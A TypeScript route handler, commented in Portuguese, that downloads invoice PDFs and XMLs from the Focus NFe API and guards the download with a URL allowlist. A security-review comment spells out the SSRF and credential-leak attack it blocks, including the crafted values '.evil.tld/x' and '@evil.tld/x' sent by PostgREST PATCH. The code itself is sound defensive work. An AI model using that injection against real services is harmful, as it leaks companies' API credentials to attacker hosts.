// @custom — PR 1.3 + fix NFSe Nacional download (2026-05-28).
//
// Em NFSe Nacional, a Focus NÃO expõe `/v2/nfsen/:ref.pdf` ou `.xml` — esses
// endpoints existem só pra NFe/NFCe. Pra DPS Nacional, o callback do webhook
// traz `url_danfse` (URL S3 pré-assinada, sem auth) e `caminho_xml_nota_fiscal`
// (path relativo dentro da Focus, exige Basic Auth da empresa).
//
// Esse route handler resolve assim:
//   - PDF: se nota.pdf_url for URL absoluta (NFSe Nacional → S3), proxy sem auth.
//          se for path relativo, prepend base Focus + auth.
//          se vazio, fallback nos endpoints legacy (NFe/NFCe).
//   - XML: idem, mas como NFSe Nacional sempre dá path relativo, sempre prepend + auth.
import { createServerClient } from '@/lib/supabase/server';
import { focus, type FocusEnv } from '@/lib/clients/focus-nfe';
import { assertTipoDoc } from '@/lib/fiscal/notas-tipo';
import { urlDownloadPermitida } from '@/lib/security/url-allowlist';
import { assertAceitesEmDia } from '@/lib/lgpd/pendencia-aceite';
import { tokenParaAmbiente } from '@/lib/fiscal/resolver-credencial';

export const runtime = 'nodejs';

const FOCUS_BASE_HOM = 'https://homologacao.focusnfe.com.br';
const FOCUS_BASE_PROD = 'https://api.focusnfe.com.br';

function focusBase(env: FocusEnv): string {
  return env === 'prod' ? FOCUS_BASE_PROD : FOCUS_BASE_HOM;
}

// Boolean puro, NAO type predicate (`s is string`): com o predicate o TS
// estreita o ramo falso para `never` e `!isAbsoluteUrl(x) && x.startsWith('/')`
// deixa de compilar — e é justamente essa checagem de forma que fecha o SSRF
// abaixo.
function isAbsoluteUrl(s: string | null): boolean {
  return !!s && /^https?:\/\//i.test(s);
}

/**
 * Monta a URL final a partir do que está salvo na nota e SÓ devolve se ela
 * passar pela allowlist. `null` = recusar o download.
 *
 * POR QUE A ALLOWLIST TEM DE VALER PARA OS DOIS RAMOS (revisão de segurança,
 * 20/08/2026): a versão anterior chamava `urlDownloadPermitida` só quando
 * `isAbsoluteUrl(savedUrl)` era verdadeiro — o ramo relativo concatenava cru e
 * ia direto para o `fetch`. Como `notas_fiscais_update` (0010) não restringe
 * COLUNA, o dono da empresa grava `xml_url = '.evil.tld/x'` por
 * `PATCH /rest/v1/notas_fiscais?id=eq.<id>` no PostgREST e abre o download:
 * `https://api.focusnfe.com.br` + `.evil.tld/x` vira
 * `https://api.focusnfe.com.br.evil.tld/x` — host DO ATACANTE — e o servidor
 * manda o `Authorization: Basic <token decifrado da empresa>` para lá. O
 * `redirect: 'manual'` não protege nada nesse caso: o primeiro host já é dele.
 * Variante do mesmo buraco: `'@evil.tld/x'` faz o host da Focus virar userinfo.
 *
 * Duas checagens, não uma:
 *  1) forma do path relativo — a Focus sempre devolve caminho começando em '/'
 *     (`caminho_xml_nota_fiscal`, `caminho_danfe`); qualquer outra coisa está
 *     mexendo no HOST, não no path;
 *  2) `urlDownloadPermitida` sobre a URL FINAL — é a única que fecha o caso do
 *     ramo absoluto e a rede de segurança do relativo. Ela compara host por
 *     igualdade ou sufixo com ponto (nunca `startsWith`/`includes`), então
 *     `api.focusnfe.com.br.evil.tld` é recusado.
 */
function urlFinalPermitida(savedUrl: string, env: FocusEnv): string | null {
  if (!isAbsoluteUrl(savedUrl) && !savedUrl.startsWith('/')) return null;
  const url = isAbsoluteUrl(savedUrl) ? savedUrl : `${focusBase(env)}${savedUrl}`;
  return urlDownloadPermitida(url) ? url : null;
}

export async function GET(
  req: Request,
  { params }: { params: Promise<{ id: string }> },
) {
  const { id } = await params;
  const formato = new URL(req.url).searchParams.get('formato');
  if (formato !== 'xml' && formato !== 'pdf') {
    return new Response('formato inválido (use xml ou pdf)', { status: 400 });
  }

  const supabase = await createServerClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return new Response('não autenticado', { status: 401 });
  const gate = await assertAceitesEmDia(user.id);
  if (!gate.ok) return new Response(gate.error, { status: 403 });
  const { data: profile } = await supabase
    .from('profiles').select('current_company').eq('user_id', user.id).single();
  const companyId = (profile?.current_company ?? null) as string | null;
  if (!companyId) return new Response('sem empresa', { status: 400 });

  const { data: nota } = await supabase
    .from('notas_fiscais')
    .select('tipo_documento, referencia, pdf_url, xml_url, ambiente')
    .eq('id', id).eq('company_id', companyId).maybeSingle();
  if (!nota) return new Response('nota não encontrada', { status: 404 });

  // O ambiente é o DA NOTA. Uma nota de homologação baixada da base de produção
  // devolve 404 no PDF e no XML.
  const ENV = ((nota.ambiente ?? 'hom') as FocusEnv);
  const focusToken = await tokenParaAmbiente(companyId, ENV);
  if (!focusToken) {
    return new Response('empresa sem token Focus para o ambiente desta nota', { status: 409 });
  }

  const tipo = assertTipoDoc(nota.tipo_documento as string);
  const ref = nota.referencia as string;
  const savedUrl = (formato === 'pdf' ? (nota.pdf_url as string | null) : (nota.xml_url as string | null)) ?? null;

  try {
    if (formato === 'xml') {
      // 1) URL salva (NFSe Nacional vem com path relativo; legacy pode vir absoluto)
      if (savedUrl) {
        // A allowlist vale para a URL FINAL, absoluta ou montada — ver
        // `urlFinalPermitida`. Aqui vai o Basic Auth da empresa, então este é
        // exatamente o fetch que não pode sair da Focus.
        const url = urlFinalPermitida(savedUrl, ENV);
        if (!url) {
          return new Response('origem do arquivo não permitida', { status: 400 });
        }
        // redirect:'manual' impede que um 3xx de um host allowlisted (ex.: S3/Focus)
        // saia para um alvo interno, contornando urlDownloadPermitida (anti-SSRF).
        const r = await fetch(url, { headers: { Authorization: basicAuth(focusToken) }, redirect: 'manual' });
        if (r.ok) {
          const xml = await r.text();
          return xmlResponse(xml, ref);
        }
      }
      // 2) Fallback: endpoints legacy (NFe/NFCe têm /v2/<doc>/:ref.xml)
      if (tipo === 'NFe') {
        const r = await focus.baixarXmlNfe(ref, focusToken, ENV);
        return xmlResponse(r.body, ref);
      }
      if (tipo === 'NFCe') {
        const r = await focus.baixarXmlNfce(ref, focusToken, ENV);
        return xmlResponse(r.body, ref);
      }
      return new Response('XML ainda não disponível — aguarde a autorização da prefeitura.', { status: 409 });
    }

    // PDF
    if (savedUrl) {
      // Mesma allowlist sobre a URL FINAL do ramo XML — o buraco era idêntico
      // aqui: `pdf_url = '.evil.tld/x'` também é "não absoluto" e também saía
      // com o Basic Auth da empresa. Ver `urlFinalPermitida`.
      const url = urlFinalPermitida(savedUrl, ENV);
      if (!url) {
        return new Response('origem do arquivo não permitida', { status: 400 });
      }
      // NFSe Nacional: url_danfse é S3 pré-assinada e já carrega a assinatura na
      // query — mandar o Basic Auth da Focus para o S3 seria entregar a
      // credencial a um host que não precisa dela. Só o path relativo (que por
      // construção resolve na própria Focus) leva o header.
      const r = isAbsoluteUrl(savedUrl)
        ? await fetch(url, { redirect: 'manual' })
        : await fetch(url, { headers: { Authorization: basicAuth(focusToken) }, redirect: 'manual' });
      if (r.ok) return pdfResponse(await r.arrayBuffer(), ref);
    }
    // Fallback legacy
    if (tipo === 'NFe') {
      const r = await focus.baixarDanfe(ref, focusToken, ENV);
      return pdfResponse(r.body, ref);
    }
    if (tipo === 'NFCe') {
      const r = await focus.baixarDanfeNfce(ref, focusToken, ENV);
      return pdfResponse(r.body, ref);
    }
    return new Response('PDF ainda não disponível — aguarde a autorização da prefeitura.', { status: 409 });
  } catch (e) {
    const msg = e instanceof Error ? e.message : 'falha no download';
    return new Response(`Falha ao baixar da Focus: ${msg.slice(0, 200)}`, { status: 502 });
  }
}

function basicAuth(token: string): string {
  return 'Basic ' + Buffer.from(token + ':').toString('base64');
}

function pdfResponse(body: ArrayBuffer, ref: string): Response {
  return new Response(Buffer.from(body), {
    headers: {
      'Content-Type': 'application/pdf',
      'Content-Disposition': `attachment; filename="${ref}.pdf"`,
    },
  });
}

function xmlResponse(body: string, ref: string): Response {
  return new Response(body, {
    headers: {
      'Content-Type': 'application/xml; charset=utf-8',
      'Content-Disposition': `attachment; filename="${ref}.xml"`,
    },
  });
}
